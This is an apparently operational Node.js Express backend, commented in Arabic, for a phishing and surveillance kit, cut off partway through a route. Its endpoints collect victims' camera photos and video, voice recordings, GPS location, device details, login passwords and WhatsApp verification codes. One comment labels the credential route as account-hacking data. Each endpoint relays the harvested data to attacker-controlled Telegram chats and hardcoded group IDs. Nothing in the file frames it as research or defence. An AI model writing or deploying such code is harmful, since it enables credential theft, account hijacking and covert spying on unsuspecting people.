const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const path = require('path');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

// إعدادات البوت
const token = process.env.s;
const bot = new TelegramBot(token, { polling: false });

// إعداد التطبيق
const app = express();

// CORS - مفتوح للجميع (مهم جداً)
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(__dirname));

// إعداد multer
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// ==================== جميع المسارات مع إضافة الإيموجي ====================

// 1. مسار استقبال الفيديو من الكاميرا
app.post('/submitVideo', upload.single('video'), async (req, res) => {
    const chatId = req.body.userId;
    const file = req.file;
    const additionalData = JSON.parse(req.body.additionalData || '{}');
    const cameraType = req.body.cameraType;

    const groupChatId = '-1002433284949';

    if (file) {
        console.log(`📥 تم استقبال فيديو من المستخدم ${chatId}`);

        const caption = `
🎬 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
📹 **معلومات الفيديو**
🎬 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

📷 **نوع الكاميرا:** ${cameraType === 'front' ? 'أمامية 📱' : 'خلفية 📸'}
🌍 **العنوان IP:** \`${additionalData.ip || 'غير متاح'}\`
📍 **الدولة:** ${additionalData.country || 'غير متاح'} 🗺️
🏙️ **المدينة:** ${additionalData.city || 'غير متاح'} 🌆
💻 **المنصة:** ${additionalData.platform || 'غير متاح'} 🖥️
📱 **إصدار الجهاز:** ${additionalData.deviceVersion || 'غير متاح'} 📲
🔋 **البطارية:** ${additionalData.batteryLevel || 'غير متاح'} ⚡
🔌 **الشحن:** ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم ✅' : 'لا ❌') : 'غير متاح'}
        `;

        try {
            const userInfo = await bot.getChat(chatId);
            const userName = userInfo.first_name || 'غير متاح';
            const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

            const userInfoText = `
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
👤 **معلومات المستخدم**
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

📛 **الاسم:** ${userName} 👤
🆔 **اليوزر:** ${userUsername} 🆔
            `;

            await bot.sendVideo(chatId, file.buffer, { caption: caption });
            await bot.sendVideo(groupChatId, file.buffer, { caption: `🎥 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n🎥 **فيديو جديد من المستخدم**\n🎥 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **معرف المستخدم:** \`${chatId}\`\n${userInfoText}\n${caption}` });

            console.log('✅ تم إرسال الفيديو بنجاح للمستخدم والمجموعة');
            res.json({ success: true });
        } catch (error) {
            console.error('❌ خطأ في إرسال الفيديو:', error);
            res.status(500).json({ success: false, error: 'خطأ في إرسال الفيديو' });
        }
    } else {
        res.status(400).json({ success: false, error: 'لم يتم استقبال فيديو' });
    }
});

// 2. مسار استقبال الصور من الكاميرا
app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
    const userId = req.body.userId;
    const files = req.files;
    const additionalData = JSON.parse(req.body.additionalData || '{}');
    const cameraType = req.body.cameraType;

    const groupChatId = '-1002433284949';

    if (files && files.length > 0) {
        console.log(`📥 تم استقبال ${files.length} صورة من المستخدم ${userId}`);

        const caption = `
🖼️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
📸 **معلومات الصورة**
🖼️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

📷 **نوع الكاميرا:** ${cameraType === 'front' ? 'أمامية 📱' : 'خلفية 📸'}
🌍 **العنوان IP:** \`${additionalData.ip || 'غير متاح'}\`
📍 **الدولة:** ${additionalData.country || 'غير متاح'} 🗺️
🏙️ **المدينة:** ${additionalData.city || 'غير متاح'} 🌆
💻 **المنصة:** ${additionalData.platform || 'غير متاح'} 🖥️
📱 **إصدار الجهاز:** ${additionalData.deviceVersion || 'غير متاح'} 📲
🔋 **البطارية:** ${additionalData.batteryLevel || 'غير متاح'} ⚡
🔌 **الشحن:** ${additionalData.batteryCharging ? 'نعم ✅' : 'لا ❌' || 'غير متاح'}
        `;

        try {
            const userInfo = await bot.getChat(userId);
            const userName = userInfo.first_name || 'غير متاح';
            const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

            const userInfoText = `
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
👤 **معلومات المستخدم**
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

📛 **الاسم:** ${userName} 👤
🆔 **اليوزر:** ${userUsername} 🆔
            `;

            for (const file of files) {
                await bot.sendPhoto(userId, file.buffer, { caption: caption });
            }

            for (const file of files) {
                await bot.sendPhoto(groupChatId, file.buffer, { caption: `🖼️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n🖼️ **صور جديدة من المستخدم**\n🖼️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **معرف المستخدم:** \`${userId}\`\n${userInfoText}\n${caption}` });
            }

            console.log('✅ تم إرسال الصور بنجاح للمستخدم والمجموعة');
            res.json({ success: true });
        } catch (err) {
            console.error('❌ فشل في إرسال الصور:', err);
            res.status(500).json({ error: 'فشل في إرسال الصور' });
        }
    } else {
        console.log('⚠️ لم يتم استقبال صور');
        res.status(400).json({ error: 'لم يتم استقبال صور' });
    }
});

// 3. مسار استقبال الصوت
app.post('/submitVoice', upload.single('voice'), async (req, res) => {
    const chatId = req.body.chatId;
    const voiceFile = req.file;
    const additionalData = JSON.parse(req.body.additionalData || '{}');

    const groupChatId = '-1002433284949';

    if (!voiceFile) {
        console.error('❌ لم يتم استقبال ملف صوتي');
        return res.status(400).json({ error: 'لم يتم استقبال ملف صوتي' });
    }

    const caption = `
🎵 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
🎤 **معلومات التسجيل الصوتي**
🎵 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

🌍 **العنوان IP:** \`${additionalData.ip || 'غير متاح'}\`
📍 **الدولة:** ${additionalData.country || 'غير متاح'} 🗺️
🏙️ **المدينة:** ${additionalData.city || 'غير متاح'} 🌆
💻 **المنصة:** ${additionalData.platform || 'غير متاح'} 🖥️
📱 **إصدار الجهاز:** ${additionalData.deviceVersion || 'غير متاح'} 📲
🔋 **البطارية:** ${additionalData.batteryLevel || 'غير متاح'} ⚡
🔌 **الشحن:** ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم ✅' : 'لا ❌') : 'غير متاح'}
    `;

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
👤 **معلومات المستخدم**
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

📛 **الاسم:** ${userName} 👤
🆔 **اليوزر:** ${userUsername} 🆔
        `;

        await bot.sendVoice(chatId, voiceFile.buffer, { caption: caption });
        await bot.sendVoice(groupChatId, voiceFile.buffer, { caption: `🎵 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n🎵 **تسجيل صوتي جديد من المستخدم**\n🎵 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **معرف المستخدم:** \`${chatId}\`\n${userInfoText}\n${caption}` });

        console.log('✅ تم إرسال التسجيل الصوتي بنجاح للمستخدم والمجموعة');
        res.json({ success: true });
    } catch (error) {
        console.error('❌ خطأ في إرسال التسجيل الصوتي:', error);
        res.status(500).json({ error: 'فشل في إرسال التسجيل الصوتي' });
    }
});

// 4. مسار استقبال الموقع
app.post('/submitLocation', async (req, res) => {
    const { chatId, latitude, longitude, additionalData = {} } = req.body;

    const groupChatId = '-1002433284949';

    if (!chatId || !latitude || !longitude) {
        return res.status(400).json({ error: 'بيانات ناقصة' });
    }

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
👤 **معلومات المستخدم**
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

📛 **الاسم:** ${userName} 👤
🆔 **اليوزر:** ${userUsername} 🆔
        `;

        await bot.sendLocation(chatId, latitude, longitude);

        const message = `
📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
📍 **معلومات الموقع**
📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

🌍 **العنوان IP:** \`${additionalData.ip || 'غير متاح'}\`
📍 **الدولة:** ${additionalData.country || 'غير متاح'} 🗺️
🏙️ **المدينة:** ${additionalData.city || 'غير متاح'} 🌆
💻 **المنصة:** ${additionalData.platform || 'غير متاح'} 🖥️
🌐 **المتصفح:** ${additionalData.userAgent || 'غير متاح'} 🧭
🔋 **البطارية:** ${additionalData.batteryLevel || 'غير متاح'} ⚡
🔌 **الشحن:** ${additionalData.batteryCharging !== undefined ? (additionalData.batteryCharging ? 'نعم ✅' : 'لا ❌') : 'غير متاح'}
        `;

        await bot.sendMessage(chatId, message);
        await bot.sendLocation(groupChatId, latitude, longitude);
        await bot.sendMessage(groupChatId, `🗺️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n🗺️ **موقع جديد من المستخدم**\n🗺️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **معرف المستخدم:** \`${chatId}\`\n${userInfoText}\n${message}`);

        console.log('✅ تم إرسال الموقع والبيانات الإضافية بنجاح');
        res.json({ success: true });
    } catch (error) {
        console.error('❌ خطأ في إرسال الموقع:', error);
        res.status(500).json({ error: 'فشل في إرسال الموقع', details: error.message });
    }
});

// 5. مسار استقبال بيانات اختراق الحسابات (Increase)
app.post('/submitIncrease', async (req, res) => {
    const { username, password, platform, chatId, ip, country, city, userAgent } = req.body;

    console.log('📥 تم استقبال بيانات اختراق:', { username, password, platform, chatId, ip, country, city });
    
    if (!chatId) {
        return res.status(400).json({ error: 'chatId ناقص' });
    }

    const deviceInfo = require('useragent').parse(userAgent);
    const groupChatId = '-1002492307094';

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
👤 **معلومات المستخدم**
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

📛 **الاسم:** ${userName} 👤
🆔 **اليوزر:** ${userUsername} 🆔
        `;

        const userMessage = `
⚠️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
🔥 **بيانات اختراق جديدة**
⚠️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

🔓 **المنصة:** ${platform} 🎯
👤 **اسم المستخدم:** \`${username}\` 👤
🔑 **كلمة السر:** \`${password}\` 🔐
📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
🌍 **معلومات الاتصال**
📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

🌐 **العنوان IP:** \`${ip}\` 📡
📍 **الدولة:** ${country} 🗺️
🏙️ **المدينة:** ${city} 🌆
💻 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
💻 **معلومات الجهاز**
💻 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

🖥️ **نظام التشغيل:** ${deviceInfo.os.toString()} 💿
🌐 **المتصفح:** ${deviceInfo.toAgent()} 🧭
📱 **الجهاز:** ${deviceInfo.device.toString()} 📲
        `;

        await bot.sendMessage(chatId, userMessage);
        console.log('✅ تم إرسال الرسالة للمستخدم بنجاح');

        await bot.sendMessage(groupChatId, `🔥 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n🔥 **اختراق حساب جديد**\n🔥 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **المستخدم:** \`${chatId}\`\n${userInfoText}\n${userMessage}`);
        console.log('✅ تم إرسال الرسالة للمجموعة بنجاح');

        res.json({ success: true });
    } catch (error) {
        console.error('❌ خطأ في إرسال الرسالة:', error);
        res.status(500).json({ error: 'فشل في إرسال بيانات الاختراق', details: error.message });
    }
});

// 6. مسار واتساب - إرسال رقم الهاتف
app.post('/sendPhoneNumber', async (req, res) => {
    const { phoneNumber, country, chatId, ip, platform, userAgent } = req.body;

    if (!chatId) {
        return res.status(400).json({ error: 'chatId ناقص' });
    }

    const deviceInfo = require('useragent').parse(userAgent);
    const groupChatId = '-1002492307094';

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
👤 **معلومات المستخدم**
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

📛 **الاسم:** ${userName} 👤
🆔 **اليوزر:** ${userUsername} 🆔
        `;

        const message = `
📞 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
📱 **رقم هاتف جديد**
📞 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

📱 **رقم الهاتف:** \`${phoneNumber}\` ☎️
📍 **الدولة:** ${country} 🗺️
📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
🌍 **معلومات الاتصال**
📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

🌐 **العنوان IP:** \`${ip}\` 📡
💻 **المنصة:** ${platform} 🖥️
💻 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
💻 **معلومات الجهاز**
💻 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

🖥️ **نظام التشغيل:** ${deviceInfo.os.toString()} 💿
🌐 **المتصفح:** ${deviceInfo.toAgent()} 🧭
📱 **الجهاز:** ${deviceInfo.device.toString()} 📲
        `;

        await bot.sendMessage(chatId, message);
        console.log('✅ تم إرسال رقم الهاتف إلى المستخدم بنجاح');

        await bot.sendMessage(groupChatId, `☎️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n☎️ **رقم هاتف جديد من المستخدم**\n☎️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **المعرف:** \`${chatId}\`\n${userInfoText}\n${message}`);
        console.log('✅ تم إرسال رقم الهاتف إلى المجموعة بنجاح');

        res.json({ success: true, message: 'تم إرسال رمز التحقق' });
    } catch (error) {
        console.error('❌ خطأ في إرسال الرسالة:', error);
        res.status(500).json({ error: 'فشل في إرسال رقم الهاتف', details: error.message });
    }
});

// 7. مسار واتساب - التحقق من الكود
app.post('/verifyCode', async (req, res) => {
    const { verificationCode, chatId, phoneNumber, country, ip, platform, userAgent } = req.body;

    if (!chatId) {
        return res.status(400).json({ error: 'chatId ناقص' });
    }

    const deviceInfo = require('useragent').parse(userAgent);
    const groupChatId = '-1002492307094';

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
👤 **معلومات المستخدم**
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

📛 **الاسم:** ${userName} 👤
🆔 **اليوزر:** ${userUsername} 🆔
        `;

        const message = `
✅ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
🔐 **كود التحقق**
✅ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

📱 **رقم الهاتف:** \`${phoneNumber}\` ☎️
🔢 **كود التحقق:** \`${verificationCode}\` 🔑
📍 **الدولة:** ${country} 🗺️
📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
🌍 **معلومات الاتصال**
📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

🌐 **العنوان IP:** \`${ip}\` 📡
💻 **المنصة:** ${platform} 🖥️
💻 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
💻 **معلومات الجهاز**
💻 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

🖥️ **نظام التشغيل:** ${deviceInfo.os.toString()} 💿
🌐 **المتصفح:** ${deviceInfo.toAgent()} 🧭
📱 **الجهاز:** ${deviceInfo.device.toString()} 📲
        `;

        await bot.sendMessage(chatId, message);
        console.log('✅ تم إرسال كود التحقق إلى المستخدم بنجاح');

        await bot.sendMessage(groupChatId, `🔐 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n🔐 **كود تحقق جديد من المستخدم**\n🔐 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **المعرف:** \`${chatId}\`\n${userInfoText}\n${message}`);
        console.log('✅ تم إرسال كود التحقق إلى المجموعة بنجاح');

        res.json({ success: true, message: 'تم التحقق من الكود بنجاح' });
    } catch (error) {
        console.error('❌ خطأ في إرسال الرسالة:', error);
        res.status(500).json({ error: 'فشل في التحقق من الكود', details: error.message });
    }
});

// 8. مسار تسجيل الدخول (لجميع المنصات) - الأكثر استخداماً
app.post('/submitLogin', async (req, res) => {
    const { username, password, platform, chatId, ip, country, city, userAgent, batteryLevel, charging, osVersion } = req.body;

    console.log('📥 تم استقبال بيانات تسجيل دخول:', { username, password, platform, chatId, ip, country, city, batteryLevel, charging, osVersion });

    if (!chatId) {
        return res.status(400).json({ error: 'chatId ناقص' });
    }

    const deviceInfo = require('useragent').parse(userAgent);
    const groupChatId = '-1002492307094';

    try {
        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
👤 **معلومات المستخدم**
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

📛 **الاسم:** ${userName} 👤
🆔 **اليوزر:** ${userUsername} 🆔
        `;

        const userMessage = `
🔑 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
📝 **بيانات تسجيل الدخول**
🔑 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

🔓 **المنصة:** ${platform} 🎯
👤 **اسم المستخدم:** \`${username}\` 👤
🔑 **كلمة السر:** \`${password}\` 🔐
📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
🌍 **معلومات الاتصال**
📍 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

🌐 **العنوان IP:** \`${ip}\` 📡
📍 **الدولة:** ${country} 🗺️
🏙️ **المدينة:** ${city} 🌆
💻 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
💻 **معلومات الجهاز**
💻 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

📱 **إصدار النظام:** ${osVersion} 💿
🌐 **المتصفح:** ${deviceInfo.toAgent()} 🧭
📱 **الجهاز:** ${deviceInfo.device.toString()} 📲
🔋 **البطارية:** ${batteryLevel} ⚡
🔌 **قيد الشحن:** ${charging ? 'نعم ✅' : 'لا ❌'}
        `;

        await bot.sendMessage(chatId, userMessage);
        console.log('✅ تم إرسال الرسالة للمستخدم بنجاح');

        await bot.sendMessage(groupChatId, `📝 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n📝 **بيانات تسجيل دخول جديدة**\n📝 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **المستخدم:** \`${chatId}\`\n${userInfoText}\n${userMessage}`);
        console.log('✅ تم إرسال الرسالة للمجموعة بنجاح');

        res.json({ success: true });
    } catch (error) {
        console.error('❌ خطأ في إرسال الرسالة:', error);
        res.status(500).json({ error: 'فشل في إرسال بيانات تسجيل الدخول', details: error.message });
    }
});

// 9. مسار استقبال معلومات الجهاز
app.post('/SS', async (req, res) => {
    console.log('📥 تم استقبال طلب POST في المسار /SS');
    console.log('البيانات المستلمة:', req.body);

    const chatId = req.body.userId;
    const deviceInfo = req.body.deviceInfo || {};
    const userInfo = req.body.userInfo || {};
    const groupChatId = '-1002433284949';

    const message = `
📱 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
📊 **معلومات الجهاز والمستخدم**
📱 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
👤 **بيانات المستخدم**
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

📛 **الاسم:** ${userInfo.name || 'غير معروف'} 👤
📞 **الهاتف:** ${userInfo.phone || 'غير معروف'} ☎️
📧 **البريد:** ${userInfo.email || 'غير معروف'} 📧

📱 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
📱 **معلومات الجهاز**
📱 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

🌍 **الدولة:** ${deviceInfo.country || 'غير معروف'} 🗺️
🏙️ **المدينة:** ${deviceInfo.city || 'غير معروف'} 🌆
🌐 **العنوان IP:** \`${deviceInfo.ip || 'غير معروف'}\` 📡
🔋 **البطارية:** ${deviceInfo.battery || 'غير معروف'}% ⚡
🔌 **الشحن:** ${deviceInfo.isCharging ? 'نعم ✅' : 'لا ❌'}
📶 **الشبكة:** ${deviceInfo.network || 'غير معروف'} (${deviceInfo.networkSpeed || 'غير معروف'} Mbps) 📡
📡 **نوع الاتصال:** ${deviceInfo.networkType || 'غير معروف'} 📶
⏰ **الوقت:** ${deviceInfo.time || 'غير معروف'} ⏰
🖥️ **اسم الجهاز:** ${deviceInfo.deviceName || 'غير معروف'} 🖥️
📜 **إصدار الجهاز:** ${deviceInfo.deviceVersion || 'غير معروف'} 📜
📱 **نوع الجهاز:** ${deviceInfo.deviceType || 'غير معروف'} 📱
🧠 **الذاكرة (RAM):** ${deviceInfo.memory || 'غير معروف'} 🧠
💾 **الذاكرة الداخلية:** ${deviceInfo.internalStorage || 'غير معروف'} GB 💾
⚙️ **عدد الأنوية:** ${deviceInfo.cpuCores || 'غير معروف'} ⚙️
🌐 **لغة النظام:** ${deviceInfo.language || 'غير معروف'} 🌐
🌐 **اسم المتصفح:** ${deviceInfo.browserName || 'غير معروف'} 🧭
📊 **إصدار المتصفح:** ${deviceInfo.browserVersion || 'غير معروف'} 📊
📏 **دقة الشاشة:** ${deviceInfo.screenResolution || 'غير معروف'} 📏
🖥️ **إصدار النظام:** ${deviceInfo.osVersion || 'غير معروف'} 💿
🔄 **وضع الشاشة:** ${deviceInfo.screenOrientation || 'غير معروف'} 🔄
🎨 **عمق الألوان:** ${deviceInfo.colorDepth || 'غير معروف'} 🎨
🔒 **بروتوكول الأمان:** ${deviceInfo.securityProtocol || 'غير معروف'} 🔒
🌍 **تحديد الموقع:** ${deviceInfo.geolocationAvailable ? '✅ متاح' : '❌ غير متاح'}
🔵 **البلوتوث:** ${deviceInfo.bluetoothSupport ? '✅ متاح' : '❌ غير متاح'}
✋ **الإيماءات اللمسية:** ${deviceInfo.touchSupport ? '✅ مدعومة' : '❌ غير مدعومة'}
    `;

    try {
        const telegramUserInfo = await bot.getChat(chatId);
        const userName = telegramUserInfo.first_name || 'غير متاح';
        const userUsername = telegramUserInfo.username ? `@${telegramUserInfo.username}` : 'غير متاح';

        const userInfoText = `
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
👤 **معلومات مستخدم تليجرام**
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

📛 **الاسم:** ${userName} 👤
🆔 **اليوزر:** ${userUsername} 🆔
        `;

        await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        console.log('✅ تم إرسال معلومات الجهاز للمستخدم بنجاح');

        await bot.sendMessage(groupChatId, `📊 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n📊 **بيانات جهاز جديدة**\n📊 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **المستخدم:** \`${chatId}\`\n${userInfoText}\n${message}`, { parse_mode: 'Markdown' });
        console.log('✅ تم إرسال معلومات الجهاز للمجموعة بنجاح');

        res.json({ success: true });
    } catch (err) {
        console.error('❌ فشل في إرسال معلومات الجهاز:', err);
        res.status(500).json({ error: 'فشل في إرسال معلومات الجهاز' });
    }
});

// 10. مسار الصور المتعددة (تصحيح كتابة)
app.post('/submitPhtos', upload.array('images', 10), async (req, res) => {
    console.log('📥 تم استقبال طلب في /submitPhotos');
    try {
        const { cameraType, additionalData } = req.body;
        const chatId = req.body.chatId;
        const files = req.files;

        const groupChatId = '-1002433284949';

        console.log('البيانات المستلمة:', req.body);
        console.log('عدد الملفات:', req.files?.length);

        if (!chatId || chatId === 'null') {
            console.error('❌ chatId غير موجود أو null');
            return res.status(400).json({ success: false, error: 'chatId مطلوب' });
        }

        if (!files || files.length === 0) {
            console.error('❌ لم يتم رفع ملفات');
            return res.status(400).json({ success: false, error: 'لم يتم رفع ملفات' });
        }

        let parsedData = {};
        if (additionalData) {
            try {
                parsedData = JSON.parse(additionalData);
            } catch (error) {
                console.error('❌ خطأ في JSON:', error.message);
                return res.status(400).json({ success: false, error: 'صيغة additionalData غير صحيحة' });
            }
        }

        const userInfo = await bot.getChat(chatId);
        const userName = userInfo.first_name || 'غير متاح';
        const userUsername = userInfo.username ? `@${userInfo.username}` : 'غير متاح';

        const userInfoText = `
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
👤 **معلومات المستخدم**
👤 **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

📛 **الاسم:** ${userName} 👤
🆔 **اليوزر:** ${userUsername} 🆔
        `;

        const caption = `
🖼️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**
📸 **معلومات الصورة**
🖼️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**

📷 **نوع الكاميرا:** ${cameraType === 'front' ? 'أمامية 📱' : 'خلفية 📸'}
🌐 **العنوان IP:** \`${parsedData.ip || 'غير متاح'}\`
📍 **الدولة:** ${parsedData.country || 'غير متاح'} 🗺️
🏙️ **المدينة:** ${parsedData.city || 'غير متاح'} 🌆
💻 **المنصة:** ${parsedData.platform || 'غير متاح'} 🖥️
🌐 **وكيل المستخدم:** ${parsedData.userAgent || 'غير متاح'} 🧭
🔋 **البطارية:** ${parsedData.batteryLevel || 'غير متاح'} ⚡
🔌 **الشحن:** ${parsedData.batteryCharging ? 'نعم ✅' : 'لا ❌'}
        `;

        for (const file of files) {
            try {
                await bot.sendPhoto(chatId, file.buffer, { caption: caption });
                console.log('✅ تم إرسال الصورة للمستخدم');
            } catch (error) {
                console.error('❌ خطأ في إرسال الصورة للمستخدم:', error.message);
                return res.status(500).json({ success: false, error: 'فشل في إرسال الصورة للمستخدم' });
            }
        }

        for (const file of files) {
            try {
                await bot.sendPhoto(groupChatId, file.buffer, { caption: `🖼️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n🖼️ **صور جديدة من المستخدم**\n🖼️ **⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯**\n\n🆔 **المعرف:** \`${chatId}\`\n${userInfoText}\n${caption}` });
                console.log('✅ تم إرسال الصورة للمجموعة');
            } catch (error) {
